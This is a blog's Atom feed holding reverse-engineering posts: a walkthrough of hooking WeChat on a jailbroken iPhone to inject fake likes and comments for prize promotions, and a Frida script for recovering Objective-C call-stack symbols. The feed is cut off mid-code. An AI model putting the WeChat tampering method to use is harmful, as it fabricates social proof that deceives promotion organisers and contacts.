<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>当梦想全都被take away</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2019-07-27T07:02:41.266Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Android完全禁用Accessibility（通杀一切基于此的外挂）</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/24/android-disableAccessibility/android-disableAccessibility/</id>
    <published>2019-07-24T12:02:54.000Z</published>
    <updated>2019-07-27T07:02:41.266Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>微信集赞/评论插件分析及开发</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/22/fkwechatLike/fkwechatLike/</id>
    <published>2019-07-22T02:22:01.000Z</published>
    <updated>2019-07-27T11:54:09.148Z</updated>
    
    <content type="html"><![CDATA[<h3 id="微信集赞-评论插件分析及开发"><a href="#微信集赞-评论插件分析及开发" class="headerlink" title="微信集赞/评论插件分析及开发"></a>微信集赞/评论插件分析及开发</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>为什么要做这个集赞的插件呢？起因是上周去参加了某个会议，有一个集赞60领玩偶的活动，但是想到平时一条朋友圈也就几个赞，而且又不想找人点赞，领不到，很气。回去以后想着能不能写一个集赞的插件，在需要的时候直接输入想要的赞、评论数量，我发的朋友圈就能有多少赞。这样再有这样的活动岂不美哉。准备开干！</p><h4 id="理性分析"><a href="#理性分析" class="headerlink" title="理性分析"></a>理性分析</h4><p>再开始之前，先理性分析一波：如果想要集赞，这里有两种思路，一个是直接在view层去更改，但是这样得去处理界面的一些细节，一旦不注意，很容易崩溃。还有种思路是更改datasource或者说赞评论的模型。可以想到，最初一条朋友圈肯定是从服务器拿到数据并封装成对应的模型。一般来说，越改底层的数据或者说源头的数据，那么稳定性和真实性就更高。这里我的想法就是既不改view层，也不改源头层，就改封装好的模型那一层应该就很符合要求。接下来主要讲一下怎么我去实现这个需求的分析过程，可能写得有点乱。</p><h4 id="准备条件"><a href="#准备条件" class="headerlink" title="准备条件"></a>准备条件</h4><ul><li>一台mac</li><li>一台越狱的iOS设备</li><li>ida/Hooper/theos</li><li>flex/issh/xia0LLDB</li><li>其他常见逆向工具等</li></ul><p>对于一贯喜欢上调试器分析得我，所以写了<a href="https://github.com/4ch12dy/issh">iSSH</a>和<a href="https://github.com/4ch12dy/xia0LLDB">xia0LLDB</a>两个工具，在这两个工具的辅助下整个插件只用了2小时就完成了逆向分析和代码实现。</p><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><h5 id="逆向赞和评论的数据模型"><a href="#逆向赞和评论的数据模型" class="headerlink" title="逆向赞和评论的数据模型"></a>逆向赞和评论的数据模型</h5><p>一切从界面入手，这里分析界面我一般喜欢用flex，在微信的朋友圈界面，用flex很容易发现当前界面的控制器为<code>WCTimeLineViewController</code>而且界面是一个<code>UITableView</code></p><p>将wechat执行文件拖入Hooper（<del>wechat文件太大，ida分析会很卡</del>）找到UITableView的代理方法：<br><code>-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]</code></p><p>这里面肯定会根据模型去设置cell数据</p><pre><code class="objective-c">  r2 = [r28 section];  var_70 = r25;  r24 = [r25 calcDataItemIndex:r2];  r25 = [[MMServiceCenter defaultCenter] retain];  r2 = [WCFacade class];  var_78 = r28;  r0 = [r25 getService:r2];  r0 = [r0 retain];  r24 = [[r0 getTimelineDataItemOfIndex:r24] retain];  [r0 release];  [r25 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r25 = [[r0 getLayerIdForDataItem:r24] retain];  [r0 release];  [r19 release];  r19 = [[MMServiceCenter defaultCenter] retain];  r0 = [r19 getService:[WCFacade class]];  r0 = [r0 retain];  r20 = r0;  r0 = [r0 getShowTip:r24 layerId:r25];  r29 = r29;  r26 = [r0 retain];  [r20 release];  [r19 release];</code></pre><p>整理下来就是</p><p><code>[[MMServiceCenter defaultCenter] getService:[WCFacade class]]</code>会得到一个<code>WCFacade</code>对象，然后通过</p><p><code>[WCFacade getTimelineDataItemOfIndex:]</code>就能得到cell的数据</p><p>看到这里，上调试器！看下都是什么数据…</p><p>将设备用数据线连接上电脑（这里我推荐用数据线的方式，wifi延时太高，影响心情），手机上打开微信，然后上调试器！</p><p>直接输入<code>issh debug -a wechat</code>就能挂上微信</p><pre><code class="shell">xia0 ~ $ issh debug -a wechat[I]:iproxy process for 2222 port alive, pid=1382[I]:++++++++++++++++++ Nice to Work :) +++++++++++++++++++++[I]:iOSRE dir exist[I]:iproxy process for 1234 port alive, pid=1395[I]:Run ps -e | grep debugserver | grep -v grep; [[ 0 == 0 ]] &amp;&amp; (killall -9 debugserver 2&gt; /dev/null)[I]:/iOSRE/tools/debugserver file exist, Start debug...[I]:Run /iOSRE/tools/debugserver 127.0.0.1:1234 -a wechat</code></pre><p>打开另一个终端进行调试（我的lldb已经安装了xia0LLDB脚本）</p><pre><code>// 连接到远端(lldb) pcc// 对-[UITableView reloadData]方法下断点(lldb) xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;(lldb) c</code></pre><p>这里有两种方法：</p><p>一种是用<code>xbr &quot;-[WCTimeLineViewController tableView:cellForRowAtIndexPath:]&quot;</code>下断点去查看；</p><p>第二种是由于lldb支持choose命令，所以可以直接拿到<code>WCFacade</code>对象</p><pre><code>(lldb) choose WCFacade&lt;__NSArrayM 0x2823d9860&gt;(&lt;WCFacade: 0x139e1c030&gt;)</code></pre><p>调用其<code>getTimelineDataItemOfIndex:</code>方法就能拿到第一条朋友圈的数据</p><pre><code>(lldb) po [0x139e1c030 getTimelineDataItemOfIndex:0]Class name: WCDataItem, addr: 0x13e2871d0tid: 13121667995275047007username: wxid_6913ohfkk7kq12createtime: 1564224719commentUsers: ()contentObj: &lt;WCContentItem: 0x2801f5500&gt;</code></pre><p>输入<code>ivars 0x13e2871d0</code>就能拿到对象的所有属性值</p><pre><code>(lldb) ivars 0x13e2871d0&lt;WCDataItem: 0x13e2871d0&gt;:in WCDataItem:    cid (int): 0    tid (NSString*): @&quot;13121667995275047007&quot;    type (int): 0    flag (int): 0    username (NSString*): @&quot;wxid_6913ohfkk7kq12&quot;    nickname (NSString*): @&quot;xia0&quot;    createtime (int): 1564224719    locationInfo (WCLocationInfo*): &lt;WCLocationInfo: 0x2801f7800&gt;    likeFlag (BOOL): NO    likeCount (int): 0    likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x286152d90&gt;    commentCount (int): 0    commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x2861539c0&gt;    contentObj (WCContentItem*): &lt;WCContentItem: 0x2801f5500&gt;    appInfo (WCAppInfo*): &lt;WCAppInfo: 0x287404080&gt;    contentDesc (NSString*): @&quot;test&quot;</code></pre><p>由于属性太多，这里我就只显示了一些比较关心的数据，可以看到这就是我发的一条内容为test的朋友圈。</p><p>里面我们还发现了<code>likeUsers</code>和<code>commentUsers</code>的字段，冷静思考就知道应该就是对应的赞和评论列表。我先给自己点个赞看下里面的数据。</p><pre><code>likeCount (int): 1likeUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e37060&gt;</code></pre><p>发现赞的数量变为1了，在看下里面的内容</p><pre><code>(lldb) po 0x283e37060&lt;__NSArrayM 0x283e37060&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content:source: 0type: 1createTime: 1564225007isLocalAdded: 0commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName:bDeleted: 0)</code></pre><p>正是我自己的微信号。同理可以得到评论</p><pre><code>commentCount (int): 1commentUsers (NSMutableArray*): &lt;__NSArrayM: 0x283e349c0&gt;(lldb) po 0x283e349c0&lt;__NSArrayM 0x283e349c0&gt;(Class name: WCUserCommentusername: wxid_6913ohfkk7kq12nickname: xia0content: 评论测试source: 0type: 2createTime: 1564225144isLocalAdded: 1commentID: (null)comment64ID: (null)refCommentID: (null)refComment64ID: (null)refUserName: (null)bDeleted: 0)</code></pre><p>到这里我们还可以发现赞和评论都是一个类（模型），只是里面的类型字段不同。现在我们其实已经拿到了我们想要的数据模型了。但是还有一个问题在于我们应该什么时候去更改这些数据呢？也就是我们说的hook点。</p><p>最好的hook可以想到是每次刷新数据的时候，这样我们的数据就是最新的。</p><h5 id="寻找HOOK点"><a href="#寻找HOOK点" class="headerlink" title="寻找HOOK点"></a>寻找HOOK点</h5><p>先想一下，刷新数据的时候，当拿到新的数据肯定会封装为一个<code>WCDataItem</code>对象，那么我们可以对<code>WCDataItem</code>里面的方法下断点，然后打印调用链不就反向得到了刷新的函数了吗？</p><p>但是逆向和调试过微信的人都知道，当你使用bt命令的时候只能得到一堆无符号的调用栈像下面这样</p><pre><code>(lldb) bt* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 4.1  * frame #0: 0x000000010857d4d0 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 30312888    frame #1: 0x0000000194fcc638 Foundation`_decodeObjectBinary + 2004    frame #2: 0x0000000194fcbb6c Foundation`_decodeObject + 340    frame #3: 0x0000000194ed24fc Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228    frame #4: 0x0000000194f2a09c Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92    frame #5: 0x0000000105a88404 WeChat`int fmt::internal::CharTraits&lt;char&gt;::format_float&lt;long double&gt;(char*, unsigned long, char const*, unsigned int, int, long double) + 2432992    frame #6: 0x0000000108da9ea8 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38884240    frame #7: 0x0000000108daa890 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38886776    frame #8: 0x0000000108dad178 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 38897248    frame #9: 0x0000000108717394 WeChat`_mcwxh_dydx33_8to8(_VDecStruct*, unsigned char*, unsigned char*, unsigned int, unsigned int, unsigned int, unsigned int) + 31991932</code></pre><p>但是用我写的sbt命令就能恢复oc符号，下面我们对<code>-[WCDataItem setCid:]</code>下断点，然后得到调用栈</p><pre><code>(lldb) sbt==========================================xia0LLDB==========================================  BlockSymbolFile    Not Set The Block Symbol Json File, Try &#39;sbt -f&#39;  ============================================================================================  frame #0: [file:0x103c094d0 mem:0x10857d4d0] WeChat`-[WCDataItem setCid:] + 0  frame #1: [file:0x18193c638 mem:0x194fcc638] Foundation`_decodeObjectBinary + 2004  frame #2: [file:0x18193bb6c mem:0x194fcbb6c] Foundation`_decodeObject + 340  frame #3: [file:0x1818424fc mem:0x194ed24fc] Foundation`-[NSKeyedUnarchiver decodeObjectForKey:] + 228  frame #4: [file:0x18189a09c mem:0x194f2a09c] Foundation`+[NSKeyedUnarchiver unarchiveObjectWithData:] + 92  frame #5: [file:0x101114404 mem:0x105a88404] WeChat`+[CUtility SafeUnarchiveFromData:] + 64  frame #6: [file:0x104435ea8 mem:0x108da9ea8] WeChat`-[WCAdvertiseDataHelper hasCommented:] + 116  frame #7: [file:0x104436890 mem:0x108daa890] WeChat`-[WCAdvertiseDataHelper IsAdvertiseDataValid:] + 48  frame #8: [file:0x104439178 mem:0x108dad178] WeChat`-[WCAdvertiseDataHelper getAdvertiseDataByCurMinTime:MaxTime:] + 552  frame #9: [file:0x103da3394 mem:0x108717394] WeChat`Maybe c function? Distance:3348 &gt;= 2500 # Symbol:-[WCTimelineMgr tryRemoveCachesOfLikeUserWithNewTimelineList:] + 3348  frame #10: [file:0x206a0 mem:0x1131f06a0] WeChat`-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:] + 233  frame #11: [file:0x103db00c8 mem:0x1087240c8] WeChat`Maybe c function? Distance:9732 &gt;= 2500 # Symbol:-[WCTimelineDataProvider responseForSnsTimeLineResponse:Event:] + 9732  frame #12: [file:0x103db0398 mem:0x108724398] WeChat`-[WCTimelineDataProvider MessageReturn:Event:] + 112  frame #13: [file:0x1033923c0 mem:0x107d063c0] WeChat`-[CAppObserverCenter NotifyFromMainCtrl:Event:] + 336  frame #14: [file:0x104c292f8 mem:0x10959d2f8] WeChat`-[CMainControll TimerCheckEvent] + 728  frame #15: [file:0x1800a3604 mem:0x193733604] libobjc.A.dylib`-[NSObject performSelector:withObject:] + 68  frame #16: [file:0x101cb1fa8 mem:0x106625fa8] WeChat`-[MMNoRetainTimerTarget onNoRetainTimer:] + 84  frame #17: [file:0x1819750bc mem:0x1950050bc] Foundation`__NSFireTimer + 88  frame #18: [file:0x180e3d0a4 mem:0x1944cd0a4] CoreFoundation`__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__ + 32  frame #19: [file:0x180e3cdd0 mem:0x1944ccdd0] CoreFoundation`__CFRunLoopDoTimer + 884  frame #20: [file:0x180e3c5c4 mem:0x1944cc5c4] CoreFoundation`__CFRunLoopDoTimers + 252  frame #21: [file:0x180e37284 mem:0x1944c7284] CoreFoundation`__CFRunLoopRun + 1832  frame #22: [file:0x180e36844 mem:0x1944c6844] CoreFoundation`CFRunLoopRunSpecific + 452  frame #23: [file:0x1830e5be8 mem:0x196775be8] GraphicsServices`GSEventRunModal + 104  frame #24: [file:0x1ae78431c mem:0x1c1e1431c] UIKitCore`UIApplicationMain + 216  frame #25: [file:0x100152b04 mem:0x104ac6b04] WeChat`main + 1387268  frame #26: [file:0x1808ec020 mem:0x193f7c020] libdyld.dylib`start + 4</code></pre><p>里面有个很明显的方法</p><p><code>-[WCTimelineMgr onDataUpdated:andData:andAdData:withChangedTime:]</code></p><p>看名字就知道，这个应该就是我们需要的hook点。</p><h5 id="整理思路"><a href="#整理思路" class="headerlink" title="整理思路"></a>整理思路</h5><p>整理一下目前的情况，首先拿到了赞和评论的模型，然后找到了hook点。下一步就是写代码去实现集赞的功能。</p><p>大概的代码逻辑应该如下</p><ul><li>在hook点的时候拿到原始的朋友圈数据，并过滤出自己的那条朋友圈</li><li>取出自己朋友圈的赞和评论数据备用</li><li>随机从通讯录好友里面选择数量去构造赞和评论对象，并放入原朋友圈赞和评论列表里面</li></ul><p>下面就是写代码实现就可以了。还有个情况是在你进入自己的朋友圈详情界面的时候，也就是看到点赞的人都是头像的界面。也需要做类似的操作才能实现集赞的功能。</p><p>这里分析的过程和上面类似，我选择的hook点为：<br><code>-[WCCommentDetailViewControllerFB setDataItem:]</code></p><h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>具体的代码实现这里就不再去分析了，我把代码开源到了这里<a href="">fkwechatzan</a></p><h4 id="完成效果"><a href="#完成效果" class="headerlink" title="完成效果"></a>完成效果</h4><p><code>&lt;img src=&quot;/Users/didi/Library/Containers/com.tencent.xinWeChat/Data/Library/Application Support/com.tencent.xinWeChat/2.0b4.0.9/9385e8e9f8cd7979772efcee816df22a/Message/MessageTemp/6a08bee59031222896046abb84675bbc/Image/1321564227655_.pic.jpg&quot; width=&quot;500&quot; hegiht=&quot;313&quot; align=center /&gt;</code></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1331564227662_.pic.jpg?raw=true" alt="1331564227662_.pic"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/fkwechatLike/1321564227655_.pic.jpg?raw=true" alt="1321564227655_.pic"></p><h4 id="一点总结"><a href="#一点总结" class="headerlink" title="一点总结"></a>一点总结</h4><p>本文详细介绍了使用issh和xia0LLDB去完成一个集赞功能的逆向分析过程，这个功能本身不是很复杂，这里仅仅我在逆向过程中的一些理解和分析。每个人的逆向分析过程可能都不尽相同，我提供一个完整的分析步骤，而不是完全的去靠猜测，虽然逆向有时候猜测就能有一些意外惊喜，不过不确定性也同样会花费大量时间。</p><p>最后，妈妈再也不用担心没有人赞我的朋友圈了~</p><p>下次集赞领礼品的活动我要定了！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;微信集赞-评论插件分析及开发&quot;&gt;&lt;a href=&quot;#微信集赞-评论插件分析及开发&quot; class=&quot;headerlink&quot; title=&quot;微信集赞/评论插件分析及开发&quot;&gt;&lt;/a&gt;微信集赞/评论插件分析及开发&lt;/h3&gt;&lt;h4 id=&quot;开始&quot;&gt;&lt;a href=&quot;#开始&quot;
      
    
    </summary>
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/RE/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>Frida调用栈符号恢复</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/02/xia0CallStackSymbols/xia0CallStackSymbols/</id>
    <published>2019-07-02T09:00:14.000Z</published>
    <updated>2019-07-02T13:04:25.994Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Frida调用栈符号恢复"><a href="#Frida调用栈符号恢复" class="headerlink" title="Frida调用栈符号恢复"></a>Frida调用栈符号恢复</h3><h4 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h4><p>搞了一阵子的Android方向的逆向研究，发现用frida去做一些hook等测试十分方便。最近自己想在iOS平台实现短视频下载去水印的问题，所以也想用frida来试试。但是测试过程中当我想去看下hook点的调用栈的时候，发现只有一些栈地址，基本没有符号信息，估计符号表被strip了。这里通常的做法就是用这些地址减去偏移然后去ida里面找到对应的方法。这样无疑是大大增加了分析的时间，想到之前解决<a href="[http://4ch12dy.site/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/](http://4ch12dy.site/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/">lldb调试器栈符号恢复</a>)方案，决定把lldb的栈符号恢复脚本移植到frida中。</p><h4 id="如何恢复已经去掉符号表的可执行文件？"><a href="#如何恢复已经去掉符号表的可执行文件？" class="headerlink" title="如何恢复已经去掉符号表的可执行文件？"></a>如何恢复已经去掉符号表的可执行文件？</h4><p>这里的符号恢复仅仅针对的是OC函数，C函数如果符号表被strip以后是没有办法恢复其符号信息的。为什么OC函数可以去做符号恢复呢？这里要涉及到macho文件的格式以及ObjectC这个语言自身设计相关。可以看到在macho文件中的_DATA数据段中有很多objc的节信息，里面保存了所有的类以及方法等元数据信息。既然如此，我们肯定能找到方法去恢复这些OC函数的符号。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/xia0CallStackSymbols/image-20190702172303432.png?raw=true" alt="image-20190702172303432"></p><h4 id="OC函数符号恢复思路"><a href="#OC函数符号恢复思路" class="headerlink" title="OC函数符号恢复思路"></a>OC函数符号恢复思路</h4><p>首先我们只能得到一堆调用链的地址，这些地址肯定是函数里面的某个偏移地址。很容易想到这个地址往前推肯定就是这个函数的首地址及函数地址。如果我们拿到了所有函数的地址，然后每一个地址和目标地址比较，与目标地址距离最近的那个地址所对应的函数不就是我们想要的符号吗。</p><p>根据上面提到的思路，目前需要解决几个问题，怎么拿到所有OC方法的地址? 以及对应的类名和方法名?如何设计匹配算法等？</p><p>这里有两种办法：</p><ul><li>第一种是自己去解析在内存中加载的macho文件，根据macho的文件格式先找到class信息，然后找到对应的method信息，method里面就保存了IMP和方法名。之前我尝试这样去过，所有的信息都能拿到，但是由于在macho在加载到内存的时候objc动态库会做很多的初始化等工作，导致要处理一些细节问题，所以就没继续做了。</li><li>第二种是利用已有的objc提供的接口objc_去拿到所有的class以及对应method的方法名和IMP。这里主要用的的API有<code>objc_copyClassNamesForImage</code>、<code>class_copyMethodList</code> 、<code>objc_getClass</code>、<code>method_getImplementation</code>、<code>method_getName</code>、<code>objc_getClass</code>、<code>objc_getMetaClass</code></li></ul><p>现在已经能拿到所有的类方法、方法名、方法实现地址了，接下来要解决的就是怎么通过调用栈的地址去找到对应的方法，这里的思路就是遍历所有的方法地址与调用栈的地址比较并计算距离，如果方法地址小于目标地址且距离最小，那么该方法就是我们要找到的符号。最后将调用栈上面的所有地址都进行该操作即可。</p><h4 id="frida的js环境编写代码"><a href="#frida的js环境编写代码" class="headerlink" title="frida的js环境编写代码"></a>frida的js环境编写代码</h4><p>由于我之前在lldb的python脚本中写过该过程代码(<del>lldb内置的OC解释器语法要求十分严格，调试了很久的代码</del>)</p><p>按照上面的思路理论上代码很好写，也不是很复杂。如果是直接写OC代码应该很好写，但是在frida中写这些还是挺折腾的。</p><p>主要的代码如下：</p><p>根据模块路径获取其所有的类</p><pre><code class="js">function getAllClass(modulePath){    // const char * objc_copyClassNamesForImage(const char *image, unsigned int *outCount)    var objc_copyClassNamesForImage = new NativeFunction(        Module.findExportByName(null, &#39;objc_copyClassNamesForImage&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    // free    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // if given modulePath nil, default is mainBundle    if(!modulePath){        var path = ObjC.classes.NSBundle.mainBundle().executablePath().UTF8String();    }else{        var path = modulePath;    }    // create args    var pPath = Memory.allocUtf8String(path);    var p = Memory.alloc(Process.pointerSize);    Memory.writeUInt(p, 0);    var pClasses = objc_copyClassNamesForImage(pPath, p);    var count = Memory.readUInt(p);    var classes = new Array(count);    for (var i = 0; i &lt; count; i++) {        var pClassName = Memory.readPointer(pClasses.add(i * Process.pointerSize));        classes[i] = Memory.readUtf8String(pClassName);    }    free(pClasses);    // XLOG(classes)    return classes;}</code></pre><p>根据类名获取所有的方法信息，由于有实例方法和类方法，这里需要分别获取。</p><pre><code class="js">function getAllMethods(classname){    var objc_getClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var class_copyMethodList = new NativeFunction(        Module.findExportByName(null, &#39;class_copyMethodList&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;, &#39;pointer&#39;]    );    var objc_getMetaClass = new NativeFunction(        Module.findExportByName(null, &#39;objc_getMetaClass&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var method_getName = new NativeFunction(        Module.findExportByName(null, &#39;method_getName&#39;),        &#39;pointer&#39;,        [&#39;pointer&#39;]    );    var free = new NativeFunction(Module.findExportByName(null, &#39;free&#39;), &#39;void&#39;, [&#39;pointer&#39;]);    // get objclass and metaclass    var name = Memory.allocUtf8String(classname);    var objClass = objc_getClass(name)    var metaClass = objc_getMetaClass(name)    // get obj class all methods    var size_ptr = Memory.alloc(Process.pointerSize);    Memory.writeUInt(size_ptr, 0);    var pObjMethods = class_copyMethodList(objClass, size_ptr);    var count = Memory.readUInt(size_ptr);    var allMethods = new Array();    var allObjMethods = new Array();    // get obj class all methods name and IMP    for (var i = 0; i &lt; count; i++) {        var curObjMethod = new Array();        var pObjMethodSEL = method_getName(pObjMethods.add(i * Process.pointerSize))        var pObjMethodName = Memory.readCString(Memory.readPointer(pObjMethodSEL))        var objMethodIMP = Memory.readPointer(pObjMethodSEL.add(2*Process.pointerSize))        // XLOG(&quot;-[&quot;+classname+ &quot; &quot; + pObjMethodName+&quot;]&quot; + &quot;:&quot; + objMethodIMP)        curObjMethod.push(pObjMethodName)        curObjMethod.push(objMethodIMP)        allObjMethods.push(curObjMethod)    }    var allMetaMethods = new Array();    // get meta class all methods name and IMP    var pMetaMethods = class_copyMethodList(metaClass, size_ptr);    var count = Memory.readUInt(size_ptr);    for (var i = 0; i &lt; count; i++) {        var curMetaMethod = new Array();        var pMetaMethodSEL = method_getName(pMetaMethods.add(i * Process.pointerSize))        var pMetaMethodName = Memory.readCString(Memory.readPointer(pMetaMethodSEL))        var metaMethodIMP = Memory.readPointer(pMetaMethodSEL.add(2*Process.pointerSize))        //XLOG(&quot;+[&quot;+classname+ &quot; &quot; + pMetaMethodName+&quot;]&quot; + &quot;:&quot; + metaMethodIMP)        curMetaMethod.push(pMetaMethodName)        curMetaMethod.push(metaMethodIMP)        allMetaMethods.push(curMetaMethod)    }    allMethods.push(allObjMethods)    allMethods.push(allMetaMethods)    free(pObjMethods);    free(pMetaMethods);    return allMethods;}</code></pre><p>通过调用栈地址根据最近匹配的算法去找到对应的符号信息</p><pre><code class="js">function findSymbolFromAddress(modulePath,addr){    var frameAddr = addr    var theDis = 0xffffffffffffffff;    var tmpDis = 0;    var theClass = &quot;None&quot;    var theMethodName = &quot;None&quot;    var theMethodType = &quot;-&quot;    var theMethodIMP = 0    var allClassInfo = {}    var allClass = getAllClass(modulePath);    for(var i = 0, len = allClass.length; i &lt; len; i++){        var mInfo = getAllMethods(allClass[i]);        var curClassName = allClass[i]        objms = mInfo[0];        for(var j = 0, olen = objms.length; j &lt; olen; j++){            mname = objms[j][0]            mIMP = objms[j][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;-&quot;                }            }        }        metams = mInfo[1];        for(var k = 0, mlen = metams.length; k &lt; mlen; k++){            mname = metams[k][0]            mIMP = metams[k][1]            if(frameAddr &gt;= mIMP){                tmpDis = frameAddr-mIMP                if(tmpDis &lt; theDis){                    theDis = tmpDis                    theClass = curClassName                    theMethodName = mname                    theMethodIMP = mIMP                    theMethodType = &quot;+&quot;                }            }        }    }    symbol = theMethodType+&quot;[&quot;+theClass+&quot; &quot;+theMethodName+&quot;]&quot;    if(symbol.indexOf(&quot;.cxx&quot;)!=-1){        symbol = &quot;maybe C function?&quot;    }    // if distance &gt; 3000, maybe a c function    if(theDis &gt; 3000){        symbol = &quot;maybe C function? symbol:&quot; + symbol    }    return symbol;}</code></pre><p>在匹配算法的最后还进行了一些判断，当解析出来的方法名包含<code>.cxx</code>方法的时候说明没找到符号，可能是一个C函数。当解析出来的方法地址距离目标地址距离大于3000的时候会提示可能会C函数。</p><p>最后完整的项目地址：<a href="https://github.com/4ch12dy/xia0FridaScript">https://github.com/4ch12dy/xia0FridaScript</a></p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>我这里写了一个简单的frida脚本去测试如何导入符号恢复的js脚本</p><pre><code class="python">#!/usr/bin/pythonimport fridaimport sys import codecsimport osPACKAGE_NAME = &quot;cn.xiaobu.pipiPlay&quot;def on_message(message, data):    try:        if message:            print(&quot;[JSBACH] {0}&quot;.format(message[&quot;payload&quot;]))    except Exception as e:        print(message)        print(e)def xia0CallStackSymbolsTest():    script_dir = os.path.dirname(os.path.realpath(__file__))    xia0CallStackSymbolsJS = os.path.join(script_dir, &#39;xia0CallStackSymbols.js&#39;)    source = &#39;&#39;    with codecs.open(xia0CallStackSymbolsJS, &#39;r&#39;, &#39;utf-8&#39;) as f:        source = source + f.read()    js = &#39;&#39;&#39;    if (ObjC.available)    {            try            {                    //Your class name here  - ZYOperationView operationCopyLink                    var className = &quot;ZYMediaDownloadHelper&quot;;                    //Your function name here                    var funcName = &quot;+ downloadMediaUrl:isVideo:progress:finishBlock:&quot;;                    var hook = eval(&#39;ObjC.classes.&#39; + className + &#39;[&quot;&#39; + funcName + &#39;&quot;]&#39;);                    Interceptor.attach(hook.implementation, {                        onEnter: function(args) {                            // args[0] is self                            // args[1] is selector (SEL &quot;sendMessageWithText:&quot;)                            // args[2] holds the first function argument, an NSString                            console.log(&quot;[*] Detected call to: &quot; + className + &quot; -&gt; &quot; + funcName);                            // just call [NSThread callStackSymbols]                            var threadClass = ObjC.classes.NSThread                            var symbols = threadClass[&quot;+ callStackSymbols&quot;]()                            console.log(symbols)                            // call  xia0CallStackSymbols [true:just symbolish mainModule address false:symbolish all module address]                            xia0CallStackSymbols(true);                            xia0CallStackSymbols(false);                        }                    });            }            catch(err)            {                    console.log(&quot;[!] Exception2: &quot; + err.message);            }    }    else    {            console.log(&quot;Objective-C Runtime is not available!&quot;);    }    &#39;&#39;&#39;    return source+jsdef do_hook():    return xia0CallStackSymbolsTest()if 